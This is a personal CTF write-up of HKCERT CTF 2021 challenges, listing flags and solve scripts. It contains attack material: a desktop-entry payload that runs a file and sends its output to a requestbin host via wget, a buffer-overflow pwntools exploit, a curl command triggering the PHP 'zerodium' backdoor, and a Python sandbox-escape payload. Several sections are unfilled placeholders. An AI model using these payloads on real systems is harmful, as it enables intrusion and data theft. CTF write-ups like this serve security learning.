---
hidden: true  # Remove after edit
title: "HKCERT CTF 2021 Writeup"
categories: ctf
tags: ctf writeup
date: 2021-11-22

ctf_time: Fri, 12 Nov. 2021, 18:00 HKT — Sun, 14 Nov. 2021, 18:00 HKT
ctf_type: On-line
ctf_desc: A HK Cyber Security New Generation CTF Challenge event.
ctf_format: Jeopardy
ctf_url: https://ctf.hkcert.org/
ctf_organizer: Black Bauhinia / HKCERT
ctftime_url: https://ctftime.org/event/1432

---
# Background  
{{ page.ctf_time }}  
{{ page.ctf_type }}  
{{ page.ctf_dsec }}  
Format: {{ page.ctf_format }}  
Official URL: {{ page.ctf_url }}  
Event organizers: {{ page.ctf_organizer }}  
CTFTime URL: [{{ page.ctftime_url }}]({ page.ctftime_url }})  

# Challenges
  
## Feedback (misc 50 pts)  
### Challenge:  

It is 24 hours before the game ends. Please fill us the [feedbacks](https://docs.google.com/forms/d/e/1FAIpQLScHdxrIh6534bJvtClV2umUnV_L0dPYhizNXsownL2CdmAkZw/viewform?usp=sf_link) so that we could know how to improve the contest for upcoming years!

  
### Solution:  
1. Submit feedbacks   
  
Flag: `hkcert21{th4nk5_f0r_p14y1n9_4nd_s3e_y0u_n3x7_y3ar}`  
  
## Shuffle (reverse 50 pts)  
### Challenge:  
```
I heard perfect shuffle is reproducible...

Hint (Updated on 13 Nov 19:05):

- What is .pyc? Are there some tools for reverting pyc to some readable source (maybe back to python script)?
- Maybe you can use decompyle3 or uncompyle6 to convert to pyc back to python script?
- Next you have to revert the algorithm for flag, i.e. given the output, find the corresponding input (which is flag)
- Understanding random module should help a lot... What is random.seed?
- Why do this always produces same result (for same input) but not randomly differ each time? Can you make use of this to revert back to flag?
- If it generate the same "shuffling" everytime, you should be able to know how the flag shuffles, then revert the process to get the flag?

Hint: (Update on 13 Nov 22:32) random.seed will reset the randomness state when you call it, so look carefully what the original script does!

Hint: (Update on 14 Nov 4:10) Check the python version outputted by decompyle3 / uncompyle6. Python 2 and 3 are VERY different! Also try to decompose the code into different parts if you found it too hard to understand. Maybe give it some data to test?
```
### Attachments
- [shuffle_03f016d972f11c15bb25d038a2bd6bb3.zip](https://github.com/6cyril/ctf-writeups/blob/master/HKCERT%20CTF%202021/files/shuffle_03f016d972f11c15bb25d038a2bd6bb3.zip?raw=true)  
### Solution:  
Script:
```
import random
answer = b'p\xbcl\xf0Y3C#\xf5\xf8\xb0\xe6\x98%\x17\xaf\xa8\x1d\xf1\x19\xb3i\x9aj\x1e\xccx\xb7F\xea\xfa]\r\xf1X\xc1\x8e\xee'
flag = ""

for pos in range(1,39):
    for guess in range(32,125):
        random.seed(38)
        res = list(map(int, bin(guess)[2:].rjust(8, '0')))
        for x in range(1,pos):
            random.shuffle(res)
        res = list(map(int, bin(guess)[2:].rjust(8, '0')))
        random.shuffle(res)
        if int(''.join(map(str, res)), 2) == answer[pos-1]:
             print("ans:",chr(guess))
             flag += chr(guess)
             break

print(flag)
```  
Flag: `hkcert21{s1mp13_d3shu3ff3l3_1s_s1mp13}`  
  
## The Wave of Us (forensics 50 pts)  
### Challenge:  
> 像密碼 若無線索 只好留下困惑

*IEEE Transactions on Signal Processing, Vol.51, (no.4), pp.1020--33, 2003.*

Walkthrough:

1.  Google the description
2.  Find the [GitHub repository](https://github.com/toots/microsoft-audio-watermarking) written by Microsoft
3.  Download the tool (repository) in zip
4.  Extract the zip, for example, you extract the zip under `D:\Downloads`
5.  Copy the audio file (`waterwave.wav`) to `D:\Download\microsoft-audio-watermarking-master\build\`
6.  Open the command prompt and execute the following:

```
D:\Download\microsoft-audio-watermarking-master\build\detect2003.exe D:\Download\microsoft-audio-watermarking-master\build\watermark.wav
```
1.  Record ass Hex decoded
2.  Convert all Hex it into ASCII characters, there are many [online tools](https://www.binaryhexconverter.com/hex-to-ascii-text-converter) that can be used
3.  Profit

有部分參賽者反應 Github 上的工具未能正常執行。請使用命令提示字元(cmd.exe)打開該程式。 There is some contester mentioned that the tool on Github cannot be executed normally. Please use command prompt (cmd.exe) to execute the program.  

### Attachment
- [the-wave-of-us_ed82d2616c9d118d8dc8637022902330.zip](https://github.com/6cyril/ctf-writeups/blob/master/HKCERT%20CTF%202021/files/the-wave-of-us_ed82d2616c9d118d8dc8637022902330.zip?raw=true)
### Solution:  
Follow instruction, extract the bytes after "WM=", decode hex on Cyberchef https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NjgKNkIKNjMKNjUKNzIKNzQKMzIKMzEKN0IKNzcKMzAKNzIKNjQKNzMKNUYKNjYKNzIKMzAKNkQKNUYKMzMKNkQKNzAKNzQKMzEKNkUKMzMKNzMKNzMKN0Q
```
microsoft-audio-watermarking\build\detect2003 the-wave-of-us_ed82d2616c9d118d8dc8637022902330\waterwave.wav | findstr Detected
Window=0 Watermark Detected [NC= 21.4470 WM=68]
Window=1 Watermark Detected [NC= 20.7645 WM=6B]
Window=2 Watermark Detected [NC= 20.9934 WM=63]
Window=3 Watermark Detected [NC= 21.0645 WM=65]
Window=4 Watermark Detected [NC= 20.8079 WM=72]
Window=5 Watermark Detected [NC= 20.7325 WM=74]
Window=6 Watermark Detected [NC= 20.8660 WM=32]
Window=7 Watermark Detected [NC= 20.6942 WM=31]
Window=8 Watermark Detected [NC= 20.8620 WM=7B]
Window=9 Watermark Detected [NC= 20.7891 WM=77]
Window=10 Watermark Detected [NC= 20.7809 WM=30]
Window=11 Watermark Detected [NC= 21.1518 WM=72]
Window=12 Watermark Detected [NC= 20.8987 WM=64]
Window=13 Watermark Detected [NC= 20.9555 WM=73]
Window=14 Watermark Detected [NC= 20.9826 WM=5F]
Window=15 Watermark Detected [NC= 20.6296 WM=66]
Window=16 Watermark Detected [NC= 20.8089 WM=72]
Window=17 Watermark Detected [NC= 20.8309 WM=30]
Window=18 Watermark Detected [NC= 20.6502 WM=6D]
Window=19 Watermark Detected [NC= 20.6745 WM=5F]
Window=20 Watermark Detected [NC= 20.9663 WM=33]
Window=21 Watermark Detected [NC= 20.6181 WM=6D]
Window=22 Watermark Detected [NC= 20.4951 WM=70]
Window=23 Watermark Detected [NC= 20.9045 WM=74]
Window=24 Watermark Detected [NC= 20.6903 WM=31]
Window=25 Watermark Detected [NC= 20.8252 WM=6E]
Window=26 Watermark Detected [NC= 20.8705 WM=33]
Window=27 Watermark Detected [NC= 20.8613 WM=73]
Window=28 Watermark Detected [NC= 20.8169 WM=73]
Window=29 Watermark Detected [NC= 20.7803 WM=7D]
Window=30 Watermark Detected [NC= 20.8448 WM=00]
Window=31 Watermark Detected [NC= 20.9327 WM=00]
Window=32 Watermark Detected [NC= 20.9149 WM=00]
Window=33 Watermark Detected [NC= 20.6806 WM=00]
Window=34 Watermark Detected [NC= 20.8183 WM=00]
Window=35 Watermark Detected [NC= 20.8318 WM=00]
Window=36 Watermark Detected [NC= 21.0468 WM=00]
Window=37 Watermark Not Detected.
```

Flag: `hkcert21{w0rds_fr0m_3mpt1n3ss}`  
  
## Infant Browser (pwn web 50 pts)  
### Challenge:  
<http://chal-s1.hkcert21.pwnable.hk:28098/>  
<http://chal-s2.hkcert21.pwnable.hk:28098/>  

What if someone uses wget as the browser? Flag: find the flag in the root directory with name `/proof*.sh`

NOTE: Both links serve the same challenge. You may choose any one of them.

UPDATE (12 Nov 21:52): Updated link to challenge server.

* * * * *

-   The objective of this kind of challenges is to send a malicious webpage / URI to steal sensitive information or even execute arbitrary code in the victim's machine. Unlike XSS where the impact is limited to the victim's account in a particular website, a browser / desktop app exploit, or client-side attack in general, may compromise the entire victim's machine.

-   In this challenge, we are allowed to send the victim an arbitrary URI and they will open it with `xdg-open` (just like clicking on links in a browser). To trick a victim to execute arbitrary code, we can craft an XDG Desktop Entry, which could specify what command to be executed.

-   But before we can trick the victim to open the Desktop Entry, we need to write the Desktop Entry to somewhere in the local filesystem. This could be done since the victim is using `wget` as the browser, and the current working directory is writable.

-   For example, you can upload a Desktop Entry file named `example.desktop` to your website (e.g. Github page), and then ask the victim bot to download it

```
[Desktop Entry]
Exec=sh -c "wget https://xxxxxxxxxxxxxxx.m.pipedream.net/?`/proof*.sh`"
Type=Application
```

-   If this Desktop Entry is opened, then it will execute the command after `Exec=`, which will first execute `/proof*.sh` and obtain the output, and execute `wget https://xxxxxxxxxxxxxxx.m.pipedream.net/?(the output from executing /proof*.sh)`, which allows you to capture the flag

-   Once the `example.desktop` file is written, you can ask the victim bot to open `file:///tmp/example.desktop` so that they will execute the code you planted before

-   But make sure you use a unique filename for the Desktop Entry file since the challenge platform is common to every participants

-   Too easy for you? Now you can try babyURIi...

### Attachment
- [infantbrowser_6939c231042fd155a512940cd0982f76.zip](https://github.com/6cyril/ctf-writeups/blob/master/HKCERT%20CTF%202021/files/infantbrowser_6939c231042fd155a512940cd0982f76.zip)

### Solution:  
Create a VM online, follow challenge instructions  

Flag: `hkcert21{Infant_Browser_flag_153283eeddd3002f}`  
  
## To Modify the Past (pwn 50 pts)  
### Challenge:  
```
You may want to change something from the past, decide your future.  
This challenge contains a buffer overflow vulnerability that allows attacker to write out-of-bound, overwriting the return address on the stack.  
In order to get the flag, simply overwrite the return address with the address of get_shell function.  
Find out the number of bytes input before reaching the return address, i.e. input 1234 'A's and next 8 bytes input will overwrite the return address.  
How to find the offset: https://youtu.be/Ag0OcqbVggc?t=3408  
Find out the address of get_shell function, e.g. 0x400123  
How to find the address of a function: https://youtu.be/Ag0OcqbVggc?t=3651  
Write an exploitation script to send the payload (attack input) to the server, usually this can be done by Python and a python module pwntools, e.g. sendline(b'A'*1234+p64(0x400123))  
How to use pwntools to interact with the challenge: https://youtu.be/Ag0OcqbVggc?t=2356  
Find the flag file in the server and then cat the flag!!  
https://youtu.be/Ag0OcqbVggc?t=3824  
```
### Attachments
- [warmup_6eab9fa64b5dd76649f6c0372315aabe.zip](https://github.com/6cyril/ctf-writeups/blob/master/HKCERT%20CTF%202021/files/warmup_6eab9fa64b5dd76649f6c0372315aabe.zip)  

### Solution:  
Typical Return-to-function question    
1. Find get_shell address by gdb or objdump
```
objdump -M intel -D chall | grep get_shell
0000000000401182 <get_shell>:
```
2. Using GDB, find the offload as 120    
```
gdb-peda$ pattern create 130
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAk'
gdb-peda$ x/x $rsp
0x7ffffffee218: 0x414f41413941416a
gdb-peda$ x/s $rsp
0x7ffffffee218: "jAA9AAOAAk"
gdb-peda$ pattern offset jAA9AAOAAk
jAA9AAOAAk found at offset: 120
```
3. Send 120 "A"s + address of "get_shell" + send "Y" to return to rsp="get_shell"
4. `python3 exp.py` and get flag
```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chalp.hkcert21.pwnable.hk --port 28028 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'chalp.hkcert21.pwnable.hk'
port = int(args.PORT or 28028)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

payload = b"A"*120
payload += p64(0x0401182)

io.sendline(payload)
io.sendline("Y")

io.interactive()
```
  
  
Flag: `hkcert21{be_c4r3_WIth_7he_5iZe}`  
  
## Sanity Check 玩咗先至瞓 (misc 50 pts)  
### Challenge:  
Have you joined our [Discord](https://discord.gg/bk7gfDVYM9) yet? Anyway, the flag for this challenge is `hkcert21{g00d_luck_h4v3_fun_4nd_h4ck_4_l0t}`. Go submit it!    
### Solution:  
Read english. 
  
Flag: `hkcert21{g00d_luck_h4v3_fun_4nd_h4ck_4_l0t}`  
  
## A Joke Cipher (crypto 50 pts)  
### Challenge:  
```
Placeholder    
Line 1    
Line2    
Line3    
  
```
  
### Solution:  
Placeholder    
Line 1    
Line2    
Line3    
  
  
Flag: `hkcert21{th1s_i5_wh4t_w3_c4ll3d_sn4k3o1l_crypt0sy5t3m}`  
  
## Squirrel Community 1 角落生物 1 (web 50 pts)  
### Challenge:  
```
Placeholder    
Line 1    
Line2    
Line3    
  
```
  
### Solution:  
Placeholder    
Line 1    
Line2    
Line3    
  
  
Flag: `hkcert21{squirrels-or-1-or-2-or-3-and-you}`  
  
## Timebomb (reverse 100 pts)  
### Challenge:  
```
Please reverse engineer and deactivate the time bomb set by Mr. Robot. Submit the deactivation key as the flag.  
```
### Attachments:
- timebomb_20799fed87d97c7a9b7fcd00af5a21e8.zip
  
### Solution:  
This is a question about Windows binary, after obvious try like `strings MrRobot_GasExplosionTimer.exe`, get x64dbg debugger, open the binary and press Run for a few times:
1. Press Run to the point where the program ask for deactivation key
2. Find Pattern by shortcut key `Ctrl+B` or right-click the memory dump area 'Dump 1' at the bottom left corner
3. Search for flag format like 'hkcert21' and 'h k c e r t 2 1' (`68 00 6B 00 63 00 65 00 72 00 74 00 32 00 31 00` in hex)
4. Double click on each results and get the flag
 
Flag: `hkcert21{iIE6yg6+ATYPmsujkytqkQ==}`  
  
## Babyxss (web 100 pts)  
### Challenge:  
Have you tried the infant xss challenge in the training platform? If you did, then you can try out this BABY XSS CHALLENGE...

[http://babyxss-m7neh9.hkcert21.pwnable.hk](http://babyxss-m7neh9.hkcert21.pwnable.hk/)

XSS Bot: [http://xssbot-cxild5.hkcert21.pwnable.hk](http://xssbot-cxild5.hkcert21.pwnable.hk/)
### Solution:  
You may just need a requestbin to complete  
https://pipedream.com/requestbin   
https://requestbin.net/   
  
Flag: `hkcert21{zOMG_MY_KEYBOARD_IS_BROKEN_CANNOT_TURN_OFF_CAPSLOCK111111111}`  
  
## Scattered (reverse 100 pts)  
### Challenge:  
```
Looks like the binary contains no flag.....  
Can you help us to find the flag? There is only weird strings inside....  
```
### Attachments
[scattered_605e04699fe3f83e375fc02c4ba09fe2.zip](https://github.com/6cyril/ctf-writeups/blob/master/HKCERT%20CTF%202021/files/scattered_605e04699fe3f83e375fc02c4ba09fe2.zip)     
### Solution:  
```
./strings
Hello world!
Seems putting flag in binary will leak flag easily...
I heard string obfuscation can prevent that :thinking:
Now I obfuscate all the strings, find me if you can!
```
1. Debug through gdb-peda
2. Find 1st part of flag string `hkcert21{str_0bfU5c4t1oN_x0r_X0r`, noted '}' is not in the string
3. Find 2nd part of flag string by examining memory address after the 1st part, or `find _`
```
sh> ./gdb strings
gdb-peda$ start
gdb-peda$ find hkcert21
Searching for 'hkcert21' in: None ranges
Found 1 results, display max 1 items:
strings : 0x6031b0 ("hkcert21{str_0bfU5c4t1oN_x0r_X0r")

gdb-peda$ x/20s 0x6031b0
0x6031b0 <_ZZNK3$_0clEvE15obfuscated_data>:     "hkcert21{str_0bfU5c4t1oN_x0r_X0r"
0x6031d1 <_ZZNK3$_0clEvE15obfuscated_data+33>:  ""
0x6031d2:       ""
0x6031d3:       ""
0x6031d4:       ""
0x6031d5:       ""
0x6031d6:       ""
0x6031d7:       ""
0x6031d8 <_ZGVZNK3$_0clEvE15obfuscated_data>:   "\001"
0x6031da <_ZGVZNK3$_0clEvE15obfuscated_data+2>: ""
0x6031db <_ZGVZNK3$_0clEvE15obfuscated_data+3>: ""
0x6031dc <_ZGVZNK3$_0clEvE15obfuscated_data+4>: ""
0x6031dd <_ZGVZNK3$_0clEvE15obfuscated_data+5>: ""
0x6031de <_ZGVZNK3$_0clEvE15obfuscated_data+6>: ""
0x6031df <_ZGVZNK3$_0clEvE15obfuscated_data+7>: ""
0x6031e0 <_ZZNK3$_1clEvE15obfuscated_data>:     "_w1tH_d3t3rm1n1st1c_h45h3s}"
0x6031fc <_ZZNK3$_1clEvE15obfuscated_data+28>:  ""
0x6031fd:       ""
0x6031fe:       ""
0x6031ff:       ""
```  
Flag: `hkcert21{str_0bfU5c4t1oN_x0r_X0r_w1tH_d3t3rm1n1st1c_h45h3s}`  
  
## Step by Step (reverse 100 pts)  
### Challenge:  
Retrieve the flag step by step.
### Attachment:
- [excel_4891c2b27e2312569280036715a101b9.zip](https://github.com/6cyril/ctf-writeups/blob/master/HKCERT%20CTF%202021/files/excel_4891c2b27e2312569280036715a101b9.zip?raw=true)
### Solution:  
As I don't have Office installation, I uploaded the excel file to Onedrive Personal and the formulas worked normally.  

The original input is "Type and check your flag!" which has a length of 25, just need to try flag format like `hkcert21{xxxxxxxxxxxxxxx}` and manually bruteforce each characters.

Flag: `hkcert21{funny_excel_rev}` 
  
## The Wilderness (web 100 pts)  
### Challenge:  
> 就在回望一刻總有哀 世界已不再 誰偏偏一再 等待 到終於不記得等待

Mystiz likes PHP most. He has been programming in PHP at the time PHP 5 was released. Time flies and here comes PHP 8. He decided to craft a Docker image as a sandbox... What can go wrong?

<http://chalp.hkcert21.pwnable.hk:28364/>
### Attachment:
- [sea-of-thorns_e045a87b1909724e7292510354cc1f3b.zip](https://github.com/6cyril/ctf-writeups/blob/master/HKCERT%20CTF%202021/files/sea-of-thorns_e045a87b1909724e7292510354cc1f3b.zip?raw=true)
### Solution:  
* Check the Dockerfile the challenge is built on a specific PHP version
```
RUN cd /tmp && wget https://github.com/php/php-src/archive/c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip \
            && unzip c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip \
            && cd php-src-* && ./buildconf && ./configure --with-zlib && make -j4
```
* Googling it shows that it's a PHP version affected by recent supply chain attack and has a backdoor  
* Find link with instruction to exploit it [here](https://www.qiuye.ink/2021/04/03/php%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/)
* Run command `curl -H 'User-Agentt: zerodiumsystem("cat index.php");' http://chalp.hkcert21.pwnable.hk:28364/`
  
Flag: `hkcert21{vu1n3r1b1li7ie5_m1gh7_c0m3_fr0m_7h3_5upp1y_ch41n}`  
  
## Cipher Mode Picker (crypto 100 pts)  
### Challenge:  
```
Placeholder    
Line 1    
Line2    
Line3    
  
```
  
### Solution:  
Placeholder    
Line 1    
Line2    
Line3    
  
  
Flag: `hkcert21{w3_sh0u1d_n0t_g1v3_much_fr3ed0m_t0_us3r5_wh3n_1t_c0m3s_t0_cryp70gr4phy}`  
  
## Tuning Master (Read) (web misc 150 pts)  
### Challenge:  
```
Do you know how to cast spells, Shaman King?  
http://偽女子.柳枊曳曳棘朿.ctf通靈師.hkcert.dsa.2048.pub:28237  
http://偽女子.哪咧嘩唔咬哤.ctf通靈師.hkcert.dsa.2048.pub:28237  
Part 1: Read the source code of home page  
```
### Solution:  
1. After some trial-and-error I could find out below relationships:  
```
偽女子 xn--czq51t5pb
柳枊曳曳棘朿 = bin2hex() xn--mova2urk5r76b
哪咧嘩唔咬哤 = hex2bin() xn--surk2ova5so5d
柳枊曳曳棘朿.哪咧嘩唔咬哤 = hex2bin(bin2hex) =  /var/www/html/index.php
```
- Visiting 柳枊曳曳棘朿.哪咧嘩唔咬哤.ctf通靈師.hkcert.dsa.2048.pub:28237 returns `/var/www/html/index.php` which seems to be the original input to functions  
2. Attempted to add a few characters as subdomain in front of the input, returned `Call to undefined function ()`  
3. Attempted to add a few more characters like 11111111111111. , returned `Call to undefined function 1111()`, indicating some forms of strings chopping and transformations performed  
4. Input `11111abcdef11111` returned `nopqrs`, looks like some form of ROT substition  
5. Use PHP function `file_get_contents` and input `/var/www/html/index.php` and get the source code  
`view-source:http://11111svyr_trg_pbagragf11111.xn--ctf-tk2f171td9i.hkcert.dsa.2048.pub:28237/`      
[CyberChef Recipe](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto'/disabled)ROT13(true,true,false,13)&input=MTExMTFzdnlyX3RyZ19wYmFncmFnZjExMTEx)  
  
Flag: `hkcert21{HA*HA*HA*NA*HA*NA*SE*HA*HA*NA*NA*SE}`  
  
## Because I said it (web 150 pts)  
### Challenge:  
因講了出來 便會失去吸引力 失去機會被愛 因講了出來 便會失去所有 想象中的可愛

If you can solve Rickroll in 2020, you will be able to solve it. Probably.

本題所使用的 PHP 版本為 8.0.12。 The PHP version used for the challenge is 8.0.12.

http://chalf.hkcert21.pwnable.hk:28156/
### Solution:  
- By inspecting source.php, it's clearly a PHP magic hash challenge with "hkcert" at the beginning. `if( hash('md5', $password) == 0 &&`
- There is a checking on not repeating other team's input `if (!exec('grep '.escapeshellarg($password).' ./used_pw.txt')) {`
- Spent some time to write and test script and find this reference:
```
# Code snippet source: https://hackmd.io/@Chivato/rkj-Y1GVI
from itertools import product
import hashlib
for x in range(0,10):
  print("Doing:",x)
  for combo in product("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", repeat=x):
    password = "hkcert" + "".join(combo)
    result = hashlib.md5(password.encode()).hexdigest()
    if result.startswith("0e") and result[2:].isdigit():
      print("hkcert" + "".join(combo))
    else:
      pass
```
  
Flag: `hkcert21{php_da_b3st_l4ng3ag3_3v3r_v3ry_4ws0m3}`  
  
## All missing (pwn 150 pts)  
### Challenge:  
You lose all the things, including the chance of getting out of the jail of python.

```source-shell
nc chalp.hkcert21.pwnable.hk 28004
```
chall.py
```
backup_eval = eval
backup_print = print

input = input()
if '[' in input or ']' in input:
	# print('[You failed to break the jail]')
	# exit(-1)
    
backup_eval = eval
backup_print = print

globals()['__builtins__'].__dict__.clear()
backup_print(backup_eval(input,{},{})) 
```
### Solution:  
First of all for pyjail1, after some researches I completed with below libraries suggested by this reference (https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes#finding-dangerous-libraries-loaded). The final payload is below leveraging <class '_frozen_importlib._ModuleLock'>: ().__class__.__base__.__subclasses__().pop(80).__init__.__globals__.pop('sys').modules.pop('os').system('cat flag.txt')
  
Flag: `hkcert21{nev3r_uSe_pYth0n_45_sanDBox}`  
  
## Steamed Meatball (misc 150 pts)  
### Challenge:  
You got the source code already, now what do you want? Dockerfile?  
![pic](https://github.com/6cyril/ctf-writeups/blob/master/HKCERT%20CTF%202021/images/meatball.png?raw=true)  
`nc chalp.hkcert21.pwnable.hk 28338`  
### Solution:  
Didn't solve this one, afterwards learned that they're called Confusable characters in Unicode
https://util.unicode.org/UnicodeJsps/confusables.jsp
1. Search 山竹牛肉
2. Return 16 combinations `山⽵牛⾁ 山⽵牛肉 山⽵⽜⾁ 山⽵⽜肉 山竹牛⾁ 山竹牛肉 山竹⽜⾁ 山竹⽜肉 ⼭⽵牛⾁ ⼭⽵牛肉 ⼭⽵⽜⾁ ⼭⽵⽜肉 ⼭竹牛⾁ ⼭竹牛肉 ⼭竹⽜⾁ ⼭竹⽜肉`, put it in a file/tuple and send to server
  
Flag: `hkcert21{Dim-Sum-As-Variant_Dim-G-As-Boolean_MsgBox-CJK-Homograph}`  
  
## The Disappeared (forensics 200 pts)  
### Challenge:  
> 不怕 問善惡 在哪 傷勢會 剖白 堅忍至此仍未算轟動嗎 尚未 消失 的人 尚有 力氣 倒下

Find the login password for user `hkcertctf`.

### Attachments
-   [the-disappeared_d56bc14301029c65cee70f4c1528f2a9.dmp.xz](https://github.com/6cyril/ctf-writeups/blob/master/HKCERT%20CTF%202021/files/the-disappeared_d56bc14301029c65cee70f4c1528f2a9.dmp.xz)
### Solution:  
1. Extract the .dmp file
2. `strings disappeared_d56bc14301029c65cee70f4c1528f2a9.dmp > strings.txt`
3. `cat strings.txt | grep hkcert21`
    
Flag: `hkcert21{y0u_ar3_n0w_lsadump_m4st3r}`  
## JQ Playground (web 200 pts)  
### Challenge:  
Description
I wrote a simple testbed for the JSON processor jq!

The flag is written in the file /flag.

http://chalp.hkcert21.pwnable.hk:28370/
### Solution:  
`jq` command has a --rawfile option, although not displayed in the challenge web app, you can substitue one option with --rawfile and apply an appropriate payload.
    
Flag: `hkcert21{y0u\are\n0w\jq\expert!}`  
  
## Scratch-tic-tac-toe 回到12歲 (misc 200 pts)  
### Challenge:  
```
Placeholder    
Line 1    
Line2    
Line3    
  
```
  
### Solution:  
Placeholder    
Line 1    
Line2    
Line3    
  
  
Flag: `hkcert21{he11o_caesar_cipher}`  
  
## No Door 2 (Forensics 200 pts)  
### Challenge:  
```
白雪般是幻象 侍女般是幻象 那角色是幻象 讓我關掉幻象 會勇敢和頑強 你也許亦像樣  
There's must be some part the author can hide the flag. If you can't solve the challenge, you better take a rest and go for an eye examination.  
https://lihi1.com/6IvWe Password: hkcertctf2021  
https://gather.town/app/sWBohD9YwwnU00Sl/hidden-space  
Backup: https://gather.town/app/H4NHCY3Owcom1iyd/hidden-space   
```
### Solution:  
1. Do not miss this image embedded as the Mini-Map    
![pic](https://github.com/6cyril/ctf-writeups/raw/master/HKCERT%20CTF%202021/images/psKy9qufW85qtlMksB1UVb.png)
2. Load the image to Stegsolve.jar ([Find it here](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve))
3. Press the '>' button and wait for luck
4. You will find flag at "Red Plane 1"
  
Flag: `hkcert21{hidd3n_f14g_is_in_th3_b3ckgr0und}`  
  
## Old Fashioned ↑←↓↑x (forensics 250 pts)  
### Challenge:  
```
What is this cheat code up-left-down-upx?
```
### Attachments
- [old-fashioned-up-left-down-up-x_361137df01363bfb8b90f911cdd09d54.zip](https://github.com/6cyril/ctf-writeups/blob/master/HKCERT%20CTF%202021/files/old-fashioned-up-left-down-up-x_361137df01363bfb8b90f911cdd09d54.zip)

### Solution:  
Placeholder    
1. Install `upx` command in Linux box
2. `sh> upx -d up-left-down-up-x`
``` 
cyril@ubuntu:~/Desktop/hkcert21/tmp$ ./up-left-down-up-x2 
usage: ./test <flag> 
```
3. Debug it
```
sh> gdb ./up-left-down-up-x2 
gdb-peda$ br *main
gdb-peda$ r hkcer21{aaaaaaaaaaaaaaaaaaaaaaaaaa}
gdb-peda$ pdis
Dump of assembler code for function main:
=> 0x000055555556af50 <+0>:	push   rax
   0x000055555556af51 <+1>:	mov    rcx,rsi
   0x000055555556af54 <+4>:	movsxd rdx,edi
   0x000055555556af57 <+7>:	lea    rax,[rip+0xffffffffffffd6e2]        # 0x555555568640 <_ZN17up_left_down_up_x4main17h9c3d9d98dbda2e04E>
   0x000055555556af5e <+14>:	mov    QWORD PTR [rsp],rax
   0x000055555556af62 <+18>:	lea    rsi,[rip+0x36c1f]        # 0x5555555a1b88 <anon.3ac88b0f89de76a451571a418bf1dd1b.0.llvm.1415829685589290055>
   0x000055555556af69 <+25>:	mov    rdi,rsp
   0x000055555556af6c <+28>:	call   QWORD PTR [rip+0x392ce]        # 0x5555555a4240
   0x000055555556af72 <+34>:	pop    rcx
   0x000055555556af73 <+35>:	ret    
End of assembler dump.
```
4. Tried to step into the call at *main+28
`gdb-peda$ ni` till *main+28, `gdb-peda$ si`, nothing is found  
5. Noted there is a pointer to a function at *main+7, add breakpoint `gdb-peda$ br _ZN17up_left_down_up_x4main17h9c3d9d98dbda2e04E`
6. Re-run `gdb-peda$ r hkcer21{aaaaaaaaaaaaaaaaaaaaaaaaaa}` and step through until the program checks 1st character of our input 'h' by an instruction at _ZN17up_left_down_up_x4main17h9c3d9d98dbda2e04E+388 `cmp al,0x68`
```
[----------------------------------registers-----------------------------------]
RAX: 0x68 ('h')
RBX: 0x32 ('2')
RCX: 0x8052690 ("hkcert21{", 'a' <repeats 40 times>, "}libgccA\016")
RDX: 0x8052691 ("kcert21{", 'a' <repeats 40 times>, "}libgccA\016")
RSI: 0x0
RDI: 0x7ffffffedf10
RBP: 0x8016fd0 --> 0xcccccc0001763be9
RSP: 0x7ffffffedf10
RIP: 0x80147c4 --> 0x2fb83485c75683c
R8 : 0x80526c2 --> 0xe4163636762696c
R9 : 0x800b446 --> 0x101010101010101
R10: 0x8080808080808080
R11: 0x7fffff74bbe0 --> 0x8053600 --> 0x0
R12: 0xaaaaaaaaaaaaaaab
R13: 0x80526c2 --> 0xe4163636762696c
R14: 0x8052690 ("hkcert21{", 'a' <repeats 40 times>, "}libgccA\016")
R15: 0x7ffffffedf58
EFLAGS: 0x283 (CARRY parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80147b4 <_ZN17up_left_down_up_x4main17h9c3d9d98dbda2e04E+372>:     call   0x80144b0 <_ZN4core4iter6traits8iterator8Iterator3nth17h468771170a27cadeE>
   0x80147b9 <_ZN17up_left_down_up_x4main17h9c3d9d98dbda2e04E+377>:     cmp    eax,0x110000
   0x80147be <_ZN17up_left_down_up_x4main17h9c3d9d98dbda2e04E+382>:     je     0x8014c64 <_ZN17up_left_down_up_x4main17h9c3d9d98dbda2e04E+1572>
=> 0x80147c4 <_ZN17up_left_down_up_x4main17h9c3d9d98dbda2e04E+388>:     cmp    al,0x68
